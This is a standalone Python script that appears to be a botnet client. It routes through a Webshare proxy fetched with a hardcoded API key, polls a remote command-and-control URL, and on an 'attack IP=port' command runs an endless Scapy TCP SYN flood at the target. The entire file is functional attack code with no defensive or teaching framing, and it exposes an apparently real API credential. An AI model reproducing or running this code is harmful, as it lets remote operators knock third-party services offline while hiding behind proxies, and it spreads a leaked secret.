import requests
import re
from scapy.all import *
import time
import json

# Define the Webshare API URL and API Key
WEBSHARE_API_URL = "https://proxy.webshare.io/api/v2/proxy/list/"
API_KEY = "9veq72n75r2m6dm9yw9imrbedai8c4gxymqu559j"  # Your Webshare API Key

# Define the target URL for getting commands
url = "http://chathere.getenjoyment.net/apk_payload/index2.php"

# Setup headers for Webshare API authentication
headers = {
    "Authorization": f"Bearer {API_KEY}"
}

# Function to get a proxy from Webshare API
def get_webshare_proxy():
    try:
        response = requests.get(WEBSHARE_API_URL, headers=headers)
        if response.status_code == 200:
            proxies = response.json().get("results", [])
            if proxies:
                # Pick the first proxy from the list (you can customize this)
                proxy = proxies[0]
                proxy_str = f"socks5://{proxy['username']}:{proxy['password']}@{proxy['proxy_address']}:{proxy['proxy_port']}"
                return proxy_str
            else:
                print("No proxies available from Webshare.")
                return None
        else:
            print(f"Error fetching proxies from Webshare API: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error with Webshare API request: {e}")
        return None

# Setup proxies for requests (fetch proxy from Webshare)
proxy = get_webshare_proxy()  # Get proxy from Webshare API
if proxy:
    proxies = {
        "http": proxy,
        "https": proxy
    }

# Extract IP and Port from the command
def extract_ip_port(command):
    pattern = r"attack (\d+\.\d+\.\d+\.\d+)=(\d+)"
    match = re.match(pattern, command)
    if match:
        ip = match.group(1)
        port = int(match.group(2))
        return ip, port
    else:
        return None, None

# TCP SYN flood using Scapy
def syn_flood(ip, port):
    print(f"Starting TCP SYN flood on {ip}:{port}")
    total_packets = 0
    successful_attempts = 0
    failed_attempts = 0
    
    while True:
        try:
            # Create a SYN packet using Scapy
            packet = IP(dst=ip) / TCP(dport=port, flags="S")
            
            # Send the packet
            send(packet, verbose=0)
            
            successful_attempts += 1
        except Exception as e:
            failed_attempts += 1
        
        total_packets += 1
        print(f"Sent {total_packets} packets: Success={successful_attempts}, Failures={failed_attempts}")

# Function to listen for commands and start attacks
def listen_for_commands():
    while True:
        try:
            # Make the HTTP request with the proxy settings
            response = requests.get(url, proxies=proxies)
            
            if response.status_code == 200:
                command = response.text.strip()
                
                if command.startswith("attack"):
                    ip, port = extract_ip_port(command)
                    
                    if ip and port:
                        syn_flood(ip, port)
                    else:
                        print(f"Invalid command format: {command}")
                else:
                    print(f"Unknown command: {command}")
            else:
                print("Failed to fetch command from URL.")
            
        except requests.exceptions.RequestException as e:
            print(f"Error fetching command: {e}")
        
        # Wait for 5 seconds before checking again
        time.sleep(5)

if __name__ == "__main__":
    if proxy:  # Only run the bot if proxy is fetched successfully
        listen_for_commands()
    else:
        print("No proxy available. Cannot start the attack.")
